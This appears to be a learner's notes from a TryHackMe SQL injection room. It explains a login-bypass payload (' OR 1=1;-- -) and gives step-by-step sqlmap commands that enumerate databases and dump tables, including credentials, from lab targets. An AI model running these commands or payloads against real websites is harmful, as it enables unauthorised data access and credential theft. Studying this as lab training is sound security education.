# SQLMap Basics — Learning Summary (TryHackMe)

## Overview
This section covered **SQL Injection (SQLi)** and how **SQLMap** can be used to automatically detect and exploit vulnerable web applications.

SQLMap helps to:
- Detect SQL injection vulnerabilities
- Identify database structure
- Extract data from databases

---

## SQL Injection (Core Idea)

SQL injection happens when user input is directly inserted into a database query without proper validation.

Example query:

`SELECT * FROM users WHERE username = 'input' AND password = 'input';`

If input is not sanitised, it can be manipulated to change logic:

`' OR 1=1;-- -`

This can force the query to return true regardless of valid credentials.

---

## SQLMap Basics

### Basic usage
`sqlmap -u 'URL'`

### List databases
`sqlmap -u 'URL' --dbs`

### List tables in a database
`sqlmap -u 'URL' -D database_name --tables`

### Dump data from a table
`sqlmap -u 'URL' -D database_name -T table_name --dump`

### Use captured request (POST/login forms)
`sqlmap -r request.txt`

### More intensive scan
`sqlmap -u 'URL' --level=5`

---

## Walkthrough

### Target 1: SQL Injection on Search Endpoint

Target URL:
http://sqlmaptesting.thm/search/cat=1

---

### Step 1: Detect SQL injection
`sqlmap -u 'http://sqlmaptesting.thm/search/cat=1'`

Result:
- Injection confirmed (multiple types detected including boolean, error, time-based, UNION)
- Backend DBMS identified as MySQL

---

### Step 2: List databases
`sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' --dbs`

Result:
- users
- members

---

### Step 3: List tables in database
`sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users --tables`

Result:
- johnath
- alexas
- thomas

---

### Step 4: Dump table data
`sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users -T thomas --dump`

Result:
- Retrieved entries including:
  - Name: Thomas THM
  - Password: testing

---

## Practical Test (Webpage Login)

### Target URL
`http://MACHINE_IP/ai/includes/user_login?email=test&password=test`

---

### Step 1: Run deeper scan
`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5`

---

### Step 2: List databases
`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --dbs`

---

### Step 3: Select 'AI' database and list tables
`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D ai --tables`

---

### Step 4: Table 'user' found. Dump table data
`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D ai -T user --dump`

Result:
- Retrieved credentials user: test@chatai.com password: 12345678

---

## Summary of Workflow

Typical SQLMap process:

1. Identify vulnerable URL or request
2. Confirm SQL injection
3. Enumerate databases (--dbs)
4. Enumerate tables (-D --tables)
5. Extract data (-T --dump)

---

## Key Learning Outcome
SQLMap automates the process of exploiting SQL injection vulnerabilities by systematically discovering databases, mapping their structure, and extracting stored data.
